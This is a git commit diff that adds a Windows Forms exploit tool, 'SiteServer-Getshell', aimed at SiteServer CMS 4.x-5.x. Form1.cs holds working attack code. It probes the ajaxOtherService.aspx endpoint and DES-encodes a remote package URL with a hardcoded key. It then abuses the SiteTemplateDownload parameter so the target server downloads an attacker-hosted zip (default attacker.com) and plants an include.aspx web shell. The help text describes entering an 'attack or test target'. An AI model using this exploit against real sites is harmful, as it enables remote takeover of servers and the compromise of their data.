ad7efe9296887f1a49614516d9031a1f59424113
DeEpinGh0st <1510536500@qq.com>
2019-11-06 11:00:41 +0800

    Add multi process

---
+++ SiteServer-Getshell/Form1.Designer.cs
@@ -0,0 +1,232 @@
+﻿namespace SiteServer_Getshell
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.Encode_TextBox = new System.Windows.Forms.TextBox();
+            this.Encode_Btn = new System.Windows.Forms.Button();
+            this.Decode_Btn = new System.Windows.Forms.Button();
+            this.Decode_TextBox = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.Target_TextBox = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.RemotePackage_TextBox = new System.Windows.Forms.TextBox();
+            this.Exp_Btn = new System.Windows.Forms.Button();
+            this.Detect_Btn = new System.Windows.Forms.Button();
+            this.PayloadStatus_PicBox = new System.Windows.Forms.PictureBox();
+            this.Log_TextBox = new System.Windows.Forms.TextBox();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.Help_PicBox = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.PayloadStatus_PicBox)).BeginInit();
+            this.groupBox1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.Help_PicBox)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // Encode_TextBox
+            // 
+            this.Encode_TextBox.Location = new System.Drawing.Point(13, 29);
+            this.Encode_TextBox.Multiline = true;
+            this.Encode_TextBox.Name = "Encode_TextBox";
+            this.Encode_TextBox.Size = new System.Drawing.Size(361, 55);
+            this.Encode_TextBox.TabIndex = 0;
+            // 
+            // Encode_Btn
+            // 
+            this.Encode_Btn.Location = new System.Drawing.Point(384, 44);
+            this.Encode_Btn.Name = "Encode_Btn";
+            this.Encode_Btn.Size = new System.Drawing.Size(75, 27);
+            this.Encode_Btn.TabIndex = 1;
+            this.Encode_Btn.Text = "Encode";
+            this.Encode_Btn.UseVisualStyleBackColor = true;
+            this.Encode_Btn.Click += new System.EventHandler(this.Encode_Btn_Click);
+            // 
+            // Decode_Btn
+            // 
+            this.Decode_Btn.Location = new System.Drawing.Point(384, 115);
+            this.Decode_Btn.Name = "Decode_Btn";
+            this.Decode_Btn.Size = new System.Drawing.Size(75, 27);
+            this.Decode_Btn.TabIndex = 2;
+            this.Decode_Btn.Text = "Decode";
+            this.Decode_Btn.UseVisualStyleBackColor = true;
+            this.Decode_Btn.Click += new System.EventHandler(this.Decode_Btn_Click);
+            // 
+            // Decode_TextBox
+            // 
+            this.Decode_TextBox.Location = new System.Drawing.Point(13, 101);
+            this.Decode_TextBox.Multiline = true;
+            this.Decode_TextBox.Name = "Decode_TextBox";
+            this.Decode_TextBox.Size = new System.Drawing.Size(361, 55);
+            this.Decode_TextBox.TabIndex = 3;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(13, 30);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(89, 12);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "    Target   :";
+            // 
+            // Target_TextBox
+            // 
+            this.Target_TextBox.Location = new System.Drawing.Point(105, 25);
+            this.Target_TextBox.Name = "Target_TextBox";
+            this.Target_TextBox.Size = new System.Drawing.Size(290, 21);
+            this.Target_TextBox.TabIndex = 5;
+            this.Target_TextBox.Text = "http://www.example.com";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(13, 57);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(89, 12);
+            this.label2.TabIndex = 6;
+            this.label2.Text = "RemotePackage:";
+            // 
+            // RemotePackage_TextBox
+            // 
+            this.RemotePackage_TextBox.Location = new System.Drawing.Point(105, 52);
+            this.RemotePackage_TextBox.Name = "RemotePackage_TextBox";
+            this.RemotePackage_TextBox.Size = new System.Drawing.Size(259, 21);
+            this.RemotePackage_TextBox.TabIndex = 7;
+            this.RemotePackage_TextBox.Text = "http://www.attacker.com/package.zip";
+            // 
+            // Exp_Btn
+            // 
+            this.Exp_Btn.Location = new System.Drawing.Point(412, 22);
+            this.Exp_Btn.Name = "Exp_Btn";
+            this.Exp_Btn.Size = new System.Drawing.Size(75, 23);
+            this.Exp_Btn.TabIndex = 8;
+            this.Exp_Btn.Text = "Exploit";
+            this.Exp_Btn.UseVisualStyleBackColor = true;
+            this.Exp_Btn.Click += new System.EventHandler(this.Exp_Btn_Click);
+            // 
+            // Detect_Btn
+            // 
+            this.Detect_Btn.Location = new System.Drawing.Point(412, 51);
+            this.Detect_Btn.Name = "Detect_Btn";
+            this.Detect_Btn.Size = new System.Drawing.Size(75, 23);
+            this.Detect_Btn.TabIndex = 9;
+            this.Detect_Btn.Text = "Detect";
+            this.Detect_Btn.UseVisualStyleBackColor = true;
+            this.Detect_Btn.Click += new System.EventHandler(this.Detect_Btn_Click);
+            // 
+            // PayloadStatus_PicBox
+            // 
+            this.PayloadStatus_PicBox.Location = new System.Drawing.Point(370, 51);
+            this.PayloadStatus_PicBox.Name = "PayloadStatus_PicBox";
+            this.PayloadStatus_PicBox.Size = new System.Drawing.Size(25, 22);
+            this.PayloadStatus_PicBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.PayloadStatus_PicBox.TabIndex = 10;
+            this.PayloadStatus_PicBox.TabStop = false;
+            // 
+            // Log_TextBox
+            // 
+            this.Log_TextBox.Location = new System.Drawing.Point(15, 88);
+            this.Log_TextBox.Multiline = true;
+            this.Log_TextBox.Name = "Log_TextBox";
+            this.Log_TextBox.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
+            this.Log_TextBox.Size = new System.Drawing.Size(472, 152);
+            this.Log_TextBox.TabIndex = 11;
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.Encode_TextBox);
+            this.groupBox1.Controls.Add(this.Decode_TextBox);
+            this.groupBox1.Controls.Add(this.Encode_Btn);
+            this.groupBox1.Controls.Add(this.Decode_Btn);
+            this.groupBox1.Location = new System.Drawing.Point(15, 272);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(472, 184);
+            this.groupBox1.TabIndex = 12;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Payload En/Decoder";
+            // 
+            // Help_PicBox
+            // 
+            this.Help_PicBox.Location = new System.Drawing.Point(233, 244);
+            this.Help_PicBox.Name = "Help_PicBox";
+            this.Help_PicBox.Size = new System.Drawing.Size(33, 30);
+            this.Help_PicBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.Help_PicBox.TabIndex = 13;
+            this.Help_PicBox.TabStop = false;
+            this.Help_PicBox.Click += new System.EventHandler(this.Help_PicBox_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(504, 471);
+            this.Controls.Add(this.Help_PicBox);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.Log_TextBox);
+            this.Controls.Add(this.PayloadStatus_PicBox);
+            this.Controls.Add(this.Detect_Btn);
+            this.Controls.Add(this.Exp_Btn);
+            this.Controls.Add(this.RemotePackage_TextBox);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.Target_TextBox);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(520, 510);
+            this.MinimumSize = new System.Drawing.Size(520, 510);
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "SiteServer4.x-5.x RTD";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.PayloadStatus_PicBox)).EndInit();
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.Help_PicBox)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox Encode_TextBox;
+        private System.Windows.Forms.Button Encode_Btn;
+        private System.Windows.Forms.Button Decode_Btn;
+        private System.Windows.Forms.TextBox Decode_TextBox;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox Target_TextBox;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox RemotePackage_TextBox;
+        private System.Windows.Forms.Button Exp_Btn;
+        private System.Windows.Forms.Button Detect_Btn;
+        private System.Windows.Forms.PictureBox PayloadStatus_PicBox;
+        private System.Windows.Forms.TextBox Log_TextBox;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.PictureBox Help_PicBox;
+    }
+}
+
---
+++ SiteServer-Getshell/Form1.cs
@@ -0,0 +1,171 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Security.Cryptography;
+using System.Windows.Forms;
+using WHC.OrderWater.Commons;
+using System.Threading;
+
+namespace SiteServer_Getshell
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private string _RemotePackage;
+        private string _Target;
+        private readonly string _Key = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
+        private static readonly string AppPath = Application.StartupPath;
+        private static readonly string _VulPath = "/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl={0}&directoryName=1nclude";
+        HttpHelper httpHelper = new HttpHelper();
+
+        /// <summary>
+        /// 编码Payload
+        /// </summary>
+        /// <param name="_inputString">明文Payload</param>
+        /// <returns>编码后的Payload</returns>
+        private string Payload_Encode(string _inputString)
+        {
+            string _outString;
+            byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
+            var byKey = Encoding.UTF8.GetBytes(_Key.Length > 8 ? _Key.Substring(0, 8) : _Key);
+            var des = new DESCryptoServiceProvider();
+            var inputByteArray = Encoding.UTF8.GetBytes(_inputString);
+            var ms = new MemoryStream();
+            var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length);
+            cs.FlushFinalBlock();
+            _outString = Convert.ToBase64String(ms.ToArray());
+            _outString = _outString.Replace("+", "0add0").Replace("=", "0equals0").Replace("&", "0and0").Replace("?", "0question0").Replace("/", "0slash0");
+            return _outString;
+        }
+
+        /// <summary>
+        /// 解码Payload
+        /// </summary>
+        /// <param name="_EnPayload">编码的Payload</param>
+        /// <returns>明文Payload</returns>
+        private string Payload_Decode(string _EnPayload)
+        {
+            string _inputString;
+            string _outString;
+            _inputString = _EnPayload.Replace("0add0", "+").Replace("0equals0", "=").Replace("0and0", "&").Replace("0question0", "?").Replace("0slash0", "/");
+            byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
+            var byKey = Encoding.UTF8.GetBytes(_Key.Substring(0, 8));
+            var des = new DESCryptoServiceProvider();
+            var inputByteArray = Convert.FromBase64String(_inputString);
+            var ms = new MemoryStream();
+            var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv), CryptoStreamMode.Write);
+            cs.Write(inputByteArray, 0, inputByteArray.Length);
+            cs.FlushFinalBlock();
+            Encoding encoding = new UTF8Encoding();
+            _outString = encoding.GetString(ms.ToArray());
+            return _outString;
+        }
+
+        /// <summary>
+        /// 检测是否存在漏洞
+        /// </summary>
+        /// <param name="_Target">目标地址</param>
+        /// <returns>true:存在false:不存在</returns>
+        private bool Check_Vul(string _Target)
+        {
+            string _Url = _Target + @"/SiteServer/Ajax/ajaxOtherService.aspx";
+            if (httpHelper.GetHtml(_Url).Contains("{}"))
+            {
+                return true;
+            }
+            return false;
+        }
+
+        private void Check_Callback(string str) {
+            if (Log_TextBox.InvokeRequired)
+            {
+                // 当一个控件的InvokeRequired属性值为真时，说明有一个创建它以外的线程想访问它
+                Action<string> actionDelegate = (x) => { this.Log_TextBox.AppendText(x); };
+                // 或者
+                // Action<string> actionDelegate = delegate(string txt) { this.label2.Text = txt; };
+                this.Log_TextBox.Invoke(actionDelegate,str);
+            }
+        }
+        private void Check_Ava() {
+            _RemotePackage = RemotePackage_TextBox.Text.Trim();
+            Check_Callback(DateTime.Now.ToString()+" 检测线程启动......\r\n");
+            if (httpHelper.GetUrlError(_RemotePackage) == 200)
+            {
+                PayloadStatus_PicBox.ImageLocation = AppPath + "/images/ok.png";
+                Check_Callback(DateTime.Now.ToString() + " 模板包状态正常 ! \r\n");
+                return;
+            }
+            PayloadStatus_PicBox.ImageLocation = AppPath + "/images/no.png";
+            Check_Callback(DateTime.Now.ToString() + " 模板包不可用 ！\r\n");
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Help_PicBox.ImageLocation = AppPath + "/images/help.ico";
+        }
+
+        private void Exp_Btn_Click(object sender, EventArgs e)
+        {
+            string _html;
+            string _ExpUrl;
+            _Target = Target_TextBox.Text.Trim();
+            _RemotePackage = RemotePackage_TextBox.Text.Trim();
+            try
+            {
+                //检测是否存在漏洞
+                if (!Check_Vul(_Target))
+                {
+                    MessageBox.Show("Target does not exist vulnerability ！", "Warning",MessageBoxButtons.OK,MessageBoxIcon.Warning);
+                    return;
+                }
+                Log_TextBox.AppendText(" Target exist vulnerability !\r\n");
+                //转换URL
+                _ExpUrl = _Target + string.Format(_VulPath, Payload_Encode(_RemotePackage));
+                _html = httpHelper.GetHtml(_ExpUrl);
+                //判断写入
+                if (_html.Contains("站点模板下载成功，请到站点模板管理中查看。"))
+                {
+                    Log_TextBox.AppendText("Exploit Success!\r\n");
+                    Log_TextBox.AppendText("Please visit:\r\n" + _Target + "/SiteFiles/SiteTemplates/1nclude/include.aspx\r\n");
+                    return;
+                }
+                Log_TextBox.AppendText("Exploit failed !\r\n");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        //检测模板包是否可用
+        private void Detect_Btn_Click(object sender, EventArgs e)
+        {
+            Log_TextBox.Clear();
+            Thread CheckAva;
+            CheckAva = new Thread(new ThreadStart(Check_Ava));
+            CheckAva.Start();
+        }
+
+        private void Encode_Btn_Click(object sender, EventArgs e)
+        {
+            Decode_TextBox.Text = Payload_Encode(Encode_TextBox.Text.Trim());
+        }
+
+        private void Decode_Btn_Click(object sender, EventArgs e)
+        {
+            Encode_TextBox.Text = Payload_Decode(Decode_TextBox.Text.Trim());
+        }
+
+        private void Help_PicBox_Click(object sender, EventArgs e)
+        {
+            string _Message = "---SiteServer4.x-5.x RTD Using Manual---\r\n"
+                                + "Step 1:\r\n(Optional)Input your remote template package URL and click the \"Detect\" button to detect your package status! \r\n"
+                                + "Step 2:\r\nInput your attack or test target and then click the \"Exploit\" Button\r\n"
+                                + "Note:\r\nYou can change the Payload Package name But the shell name must be \"include.aspx\"\r\n";
+            MessageBox.Show(_Message, "Using Manual",MessageBoxButtons.OK,MessageBoxIcon.None);
+        }
+    }
+}
